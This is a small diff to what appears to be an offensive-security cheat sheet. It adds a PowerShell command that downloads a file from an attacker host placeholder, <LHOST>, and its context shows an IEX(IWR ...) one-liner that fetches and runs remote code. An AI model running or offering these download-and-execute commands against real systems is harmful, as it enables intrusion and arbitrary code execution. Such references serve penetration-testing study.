@@ -674,6 +674,7 @@ PS C:\> powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE>
 #### Short Version
 
 ```c
+PS C:\> iwr <LHOST>/<FILE> -o <FILE>
 PS C:\> IEX(IWR http://<LHOST>/<FILE>) -UseBasicParsing)
 ```
 
